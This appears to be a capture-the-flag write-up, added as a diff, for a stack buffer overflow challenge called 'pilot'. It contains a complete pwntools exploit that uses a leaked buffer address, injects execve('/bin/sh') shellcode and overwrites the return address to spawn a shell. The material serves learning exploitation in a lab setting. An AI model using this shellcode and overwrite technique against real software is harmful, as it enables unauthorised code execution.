@@ -1,0 +1,23 @@
+=== Personal solution description ===
+
+If we decompile the main function we can see a lot of "<<" operators filling the entire screen. We can see a read(0,buffer,0x40), after leaking the location of the buffer.
+
+So, the trick would be to use the location of the buffer and to overwrite the ret address with its beginning address.
+But we need to grab the output from the program. I tried using "expect" for this, but I don't think it can do it. So we're using pwntools, in python, just like the original solution.
+The solution is pretty simple. In fact it's almost identical to the original solution, due to its simplicity.
+
+---------------------------------------------------------------------------------
+	#!/usr/bin/env python3
+	from pwn import *
+
+	target = process("./pilot")
+	target.recvuntil(b"[*]Location:")
+	jmp_addr = int(target.recvline().strip(b"\n"), 16) # get the return address
+	payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" # shellcode for popping a shell
+	payload += b"A"*(0x28 - len(payload)) # padding
+	payload += p64(jmp_addr)
+	target.send(payload)
+	target.interactive()
+---------------------------------------------------------------------------------
+
+This will pop a shell when executed.
